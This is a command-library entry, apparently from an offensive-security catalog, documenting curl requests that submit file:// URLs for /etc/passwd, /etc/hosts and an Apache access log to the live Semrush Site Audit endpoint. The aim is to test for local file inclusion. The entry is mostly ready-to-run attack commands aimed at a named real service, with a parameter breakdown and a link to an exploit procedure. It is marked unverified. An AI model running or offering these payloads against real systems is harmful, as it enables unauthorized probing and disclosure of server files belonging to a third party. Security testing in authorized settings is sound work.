---
id: cmd-curl-lfi-test
data: >-
  curl -X POST 'https://app.semrush.com/siteaudit/audit' -b cookies.txt -d
  'url=file:///etc/passwd' -H 'Content-Type: application/x-www-form-urlencoded'
tags:
  - lfi
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.689Z'
verified: false
validated: true
submitted: true
---
# curl-lfi-test

## Command

```bash
curl -X POST 'https://app.semrush.com/siteaudit/audit' -b cookies.txt -d 'url=file:///etc/passwd' -H 'Content-Type: application/x-www-form-urlencoded'
```

## Description

This command tests for LFI by submitting a file:// URL to the Semrush Site Audit tool, attempting to include and potentially display local file contents due to protocol bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `'https://app.semrush.com/siteaudit/audit'` | Audit submission endpoint | Yes |
| `-b cookies.txt` | Session cookies file | Yes |
| `-d 'url=...'` | LFI payload with file path | Yes |
| `-H 'Content-Type: ...'` | Form encoding header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://app.semrush.com/siteaudit/audit' -d 'url=file:///etc/hosts'
```

### Advanced Usage

```bash
curl -X POST 'https://app.semrush.com/siteaudit/audit' -b cookies.txt -d 'url=file:///var/log/apache2/access.log' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

## Expected Output

Vulnerable responses include file contents (e.g., user list from /etc/passwd) or path disclosure errors; secure setups reject the request.

## Related

- [[Related Procedure|procedures/Exploit-LFI-in-Semrush-Site-Audit]]
